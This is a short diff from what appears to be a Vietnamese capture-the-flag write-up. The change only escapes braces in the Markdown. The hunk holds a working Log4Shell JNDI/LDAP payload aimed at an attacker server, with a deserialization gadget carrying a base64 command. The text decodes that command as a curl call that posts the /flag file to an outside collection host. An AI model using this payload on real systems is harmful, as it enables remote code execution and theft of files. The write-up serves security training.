@@ -265,7 +265,7 @@ Mọi người thay IP VPS vào chỗ bị bôi bỏ
 
 Payload send để lấy flag
 ```
-${jndi:ldap://165.22.109.11:1389/Deserialization/CommonsCollectionsK1/Command/Base64/Y3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==}
+$\{jndi:ldap://165.22.109.11:1389/Deserialization/CommonsCollectionsK1/Command/Base64/Y3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==\}
 ```
 Trong đó: `3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==` là `curl -d @/flag http://suql4mat.requestrepo.com`
 
